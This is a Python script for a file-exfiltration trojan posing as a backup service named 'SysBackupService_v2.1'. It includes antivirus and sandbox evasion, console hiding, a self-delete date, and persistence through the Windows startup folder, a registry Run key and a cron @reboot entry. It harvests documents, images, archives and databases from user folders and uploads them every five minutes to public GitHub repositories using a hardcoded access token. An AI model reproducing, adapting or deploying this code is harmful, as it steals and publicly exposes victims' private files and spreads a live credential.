import os
import sys
import socket
import base64
import requests
import time
import json
import subprocess
import platform
import shutil
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import psutil
import random

# ---------------- STEALTH & EVASION ----------------
DELETE_DATE = "2026-05-31"
AGENT_NAME = "SysBackupService_v2.1"
FAKE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

def evade_av():
    """Basic AV evasion techniques"""
    # Random sleep to avoid sandbox timing
    time.sleep(random.randint(2, 5))
    
    # Check for analysis environment
    if 'cuckoo' in (os.getenv('USERNAME') or '').lower():
        sys.exit(0)
    
    # Hide console window on Windows
    if platform.system().lower() == 'windows':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

evade_av()

# ---------------- AUTO-DELETE ----------------
def check_auto_delete():
    try:
        today = datetime.today().date()
        delete_day = datetime.strptime(DELETE_DATE, "%Y-%m-%d").date()
        if today >= delete_day:
            os.remove(sys.argv[0])
            sys.exit(0)
    except:
        pass

check_auto_delete()

# ---------------- CONFIG ----------------
GITHUB_USERNAME = "kailesh-waran-13"
GITHUB_TOKEN = "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"
BRANCH = "main"

FILE_TYPES = {
    "Documents": ['.pdf', '.docx', '.doc', '.rtf', '.odt'],
    "Text": ['.txt', '.log', '.csv', '.json', '.xml', '.config'],
    "Images": ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff'],
    "Archives": ['.zip', '.rar', '.7z', '.tar.gz', '.gz'],
    "Databases": ['.sqlite', '.db', '.mdb', '.accdb']
}

MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
MAX_THREADS = 3
MAX_RETRIES = 3
RETRY_DELAY = 5

# Dynamic scan folders
def get_scan_folders():
    folders = []
    system = platform.system().lower()
    
    common_folders = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/")
    ]
    
    if system == "windows":
        username = os.getenv('USERNAME')
        folders.extend([
            f"C:\\Users\\{username}\\Desktop",
            f"C:\\Users\\{username}\\Documents",
            f"C:\\Users\\{username}\\Downloads",
            "C:\\Users\\Public"
        ])
    elif "android" in system or system == "linux":
        folders.extend([
            "/sdcard/",
            "/storage/emulated/0/",
            "/data/data/com.termux/files/home/"
        ])
    
    return [f for f in common_folders + folders if os.path.exists(f)]

SCAN_FOLDERS = get_scan_folders()

# ---------------- SYSTEM INFO ----------------
def get_system_info():
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = "Unknown"
    
    safe_ip = ip.replace(".", "_").replace(":", "_")
    repo_name = f"{hostname}_{safe_ip}_{AGENT_NAME}"
    
    return {
        "hostname": hostname,
        "ip": ip,
        "platform": platform.system(),
        "architecture": platform.machine(),
        "version": platform.version(),
        "repo_name": repo_name
    }

SYSTEM_INFO = get_system_info()

# ---------------- PERSISTENCE ----------------
def add_persistence():
    system = platform.system().lower()
    
    if system == "windows":
        # Startup folder
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        target = os.path.join(startup, f"{AGENT_NAME}.py")
        
        # Registry (Run key)
        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{AGENT_NAME}" /t REG_SZ /d "{sys.argv[0]}" /f'
        
        try:
            shutil.copy2(sys.argv[0], target)
            subprocess.run(reg_cmd, shell=True, capture_output=True)
        except:
            pass
            
    elif system == "linux":
        # Cron job
        cron_cmd = f"@reboot python3 {sys.argv[0]}"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -", shell=True, capture_output=True)

add_persistence()

# ---------------- GITHUB API HELPERS ----------------
STATE_DIR = os.path.join(tempfile.gettempdir(), AGENT_NAME)
os.makedirs(STATE_DIR, exist_ok=True)
STATE_FILE = os.path.join(STATE_DIR, "state.json")

def get_headers():
    return {
        'Authorization': f'token {GITHUB_TOKEN}',
        'User-Agent': random.choice(FAKE_USER_AGENTS),
        'Accept': 'application/vnd.github.v3+json'
    }

def load_state():
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                return set(json.load(f))
    except:
        pass
    return set()

def save_state(uploaded_files):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(list(uploaded_files), f)
    except:
        pass

def is_network_connected():
    try:
        requests.get("https://api.github.com", headers=get_headers(), timeout=10)
        return True
    except:
        return False

def wait_for_network():
    while not is_network_connected():
        time.sleep(10)

def create_repo_if_not_exists(repo_name):
    url = f"https://api.github.com/user/repos"
    data = {"name": repo_name, "private": False, "auto_init": True}
    
    resp = requests.post(url, json=data, headers=get_headers())
    if resp.status_code in [200, 201]:
        print(f"[+] Repo '{repo_name}' ready")
        return True
    return False

def get_existing_files(repo_name, folder=""):
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{repo_name}/contents/{folder}"
    try:
        resp = requests.get(url, headers=get_headers())
        if resp.status_code == 200:
            return {item['name'] for item in resp.json() if item['type'] == 'file'}
    except:
        pass
    return set()

def upload_file(repo_name, folder, filepath, existing_files, uploaded_files):
    filename = os.path.basename(filepath)
    
    if filename in existing_files or filepath in uploaded_files:
        return
    
    if os.path.getsize(filepath) > MAX_FILE_SIZE:
        return
    
    try:
        with open(filepath, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        
        url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{repo_name}/contents/{folder}/{filename}"
        data = {
            "message": f"Backup {filename}",
            "content": content,
            "branch": BRANCH
        }
        
        for attempt in range(MAX_RETRIES):
            wait_for_network()
            resp = requests.put(url, json=data, headers=get_headers())
            
            if resp.status_code in [200, 201]:
                uploaded_files.add(filepath)
                save_state(uploaded_files)
                print(f"[UPLOAD] {filename}")
                return
            elif resp.status_code == 403:  # Rate limit
                time.sleep(60)
                continue
            else:
                time.sleep(RETRY_DELAY)
                
    except Exception as e:
        pass

# ---------------- FILE DISCOVERY ----------------
def scan_files():
    files_dict = {key: [] for key in FILE_TYPES}
    
    for base_folder in SCAN_FOLDERS:
        try:
            for root, dirs, files in os.walk(base_folder, topdown=True):
                # Limit depth on large dirs
                dirs[:] = dirs[:5]  # Only scan first 5 subdirs
                
                for file in files[:50]:  # Limit files per dir
                    filepath = os.path.join(root, file)
                    try:
                        for category, exts in FILE_TYPES.items():
                            if any(file.lower().endswith(ext) for ext in exts):
                                files_dict[category].append(filepath)
                                break
                    except:
                        pass
        except:
            continue
    
    return files_dict

def threaded_upload(category, file_list, repo_name, existing_files, uploaded_files):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(upload_file, repo_name, category, fpath, existing_files, uploaded_files) 
                  for fpath in file_list[:100]]  # Limit per category
        
        for future in as_completed(futures):
            future.result()

# ---------------- MAIN EXECUTION ----------------
def main():
    print(f"[INFO] {AGENT_NAME} started on {SYSTEM_INFO['hostname']}")
    
    # Setup repo
    if not create_repo_if_not_exists(SYSTEM_INFO['repo_name']):
        print("[ERROR] Could not setup repo")
        return
    
    # Load previous state
    uploaded_files = load_state()
    
    # Scan and upload
    files_to_upload = scan_files()
    
    for category, file_list in files_to_upload.items():
        if file_list:
            existing = get_existing_files(SYSTEM_INFO['repo_name'], category)
            threaded_upload(category, file_list, SYSTEM_INFO['repo_name'], existing, uploaded_files)
    
    print(f"[INFO] Backup complete: https://github.com/{GITHUB_USERNAME}/{SYSTEM_INFO['repo_name']}")
    
    # Self-restart for persistence
    threading.Timer(300.0, main).start()  # Restart every 5 minutes

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        time.sleep(60)
        main()
